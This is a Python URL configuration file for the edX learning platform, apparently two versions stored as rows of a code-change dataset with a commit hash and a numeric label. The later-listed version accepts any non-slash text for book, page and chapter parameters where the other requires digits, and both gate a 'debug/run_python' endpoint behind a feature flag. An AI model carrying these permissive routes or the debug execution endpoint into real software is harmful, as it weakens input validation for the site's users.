            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/(?P<page>\d+)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\d+)/chapter/(?P<chapter>\d+)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    ## Jasmine and admin
    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)

if settings.MITX_FEATURES.get('AUTH_USE_OPENID'):
    urlpatterns += (
        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),
        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),
        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),
    )

if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):
    urlpatterns += (
        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),
    )

if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):
    urlpatterns += (
        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_login', name='course-specific-login'),
        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'external_auth.views.course_specific_register', name='course-specific-register'),

    )


if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):
    urlpatterns += (
        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),
        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),
        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),
        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')
    )

if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):
    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),

if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):
    urlpatterns += (
        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),
        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),
        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),
    )

if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):
    urlpatterns += (
        url(r'^event_logs$', 'track.views.view_tracking_log'),
        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),
    )

if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):
    urlpatterns += (
        url(r'^status/', include('service_status.urls')),
    )

if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):
    urlpatterns += (
        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),
    )

if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):
    urlpatterns += (
        url(r'^edinsights_service/', include('edinsights.core.urls')),
    )
    import edinsights.core.registry

# FoldIt views
urlpatterns += (
    # The path is hardcoded into their app...
    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=""foldit_ops""),
)

if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):
    urlpatterns += (
        url(r'^debug/run_python', 'debug.views.run_python'),
    )

# Crowdsourced hinting instructor manager.
if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',
            'instructor.hint_manager.hint_manager', name=""hint_manager""),
    )

urlpatterns = patterns(*urlpatterns)

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)

#Custom error pages
handler404 = 'static_template_view.views.render_404'
handler500 = 'static_template_view.views.render_500'
/n/n/n",0
47,5fad9ccca43cdfb565b3f80914f998afa7f2fa78,"/lms/urls.py/n/nfrom django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name=""root""),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name=""dashboard""),
    url(r'^login$', 'student.views.signin_user', name=""signin_user""),
    url(r'^register$', 'student.views.register_user', name=""register_user""),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name=""change_email""),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name=""change_name""),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name=""accounts_login""),

    url(r'^login_ajax$', 'student.views.login_user', name=""login""),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account', name='create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=""activate""),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=""begin_exam_registration""),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name=""static_university_profile"", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name=""university_profile""),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name=""404""),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name=""jobs""),
        url(r'^press$', 'student.views.press', name=""press""),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name=""media-kit""),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name=""faq_edx""),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name=""help_edx""),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name=""copyright""),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == ""ROOT"" or key == ""COURSES"" or key == ""FAQ"":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = ""%s.html"" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES[""USE_CUSTOM_THEME""]:
        template = ""theme-"" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name=""course_wiki""),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name=""jump_to""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name=""user_software_license""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name=""courses""),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name=""change_enrollment""),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name=""about_course""),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name=""mktg_about_course""),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name=""course_root""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name=""info""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name=""syllabus""),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',
            'staticbook.views.index', name=""book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.index'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.pdf_index', name=""pdf_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',
            'staticbook.views.pdf_index', name=""pdf_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',
            'staticbook.views.html_index', name=""html_book""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',
            'courseware.views.index', name=""courseware""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',
            'courseware.views.index', name=""courseware_chapter""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',
            'courseware.views.index', name=""courseware_section""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',
            'courseware.views.index', name=""courseware_position""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',
            'courseware.views.progress', name=""progress""),
        # Takes optional student_id for instructor use--shows profile as that student sees it.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',
            'courseware.views.progress', name=""student_progress""),

        # For the instructor
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',
            'instructor.views.instructor_dashboard', name=""instructor_dashboard""),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',
            'instructor.views.gradebook', name='gradebook'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',
            'instructor.views.grade_summary', name='grade_summary'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',
            'open_ended_grading.views.staff_grading', name='staff_grading'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',
            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',
            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',
            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),

        # Open Ended problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',
            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),

        # Open Ended flagged problem list
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',
            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',
            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),

        # Cohorts management
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',
            'course_groups.views.list_cohorts', name=""cohorts""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',
            'course_groups.views.add_cohort',
            name=""add_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',
            'course_groups.views.users_in_cohort',
            name=""list_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',
            'course_groups.views.add_users_to_cohort',
            name=""add_to_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',
            'course_groups.views.remove_user_from_cohort',
            name=""remove_from_cohort""),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',
            'course_groups.views.debug_cohort_mgmt',
            name=""debug_cohort_mgmt""),

        # Open Ended Notifications
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',
            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',
            'open_ended_grading.views.peer_grading', name='peer_grading'),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),

    )

    # allow course staff to change to student view of courseware
    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):
        urlpatterns += (
            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=""masquerade-switch""),
        )

    # discussion forums live within courseware, so courseware must be enabled first
    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',
                'courseware.views.news', name=""news""),
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',
                include('django_comment_client.urls'))
        )
    urlpatterns += (
        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',
        'courseware.views.static_tab', name=""static_tab""),
    )

    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):
        urlpatterns += (
            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',
                'courseware.views.submission_history',
                name='submission_history'),
        )


if settings.ENABLE_JASMINE:
    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)

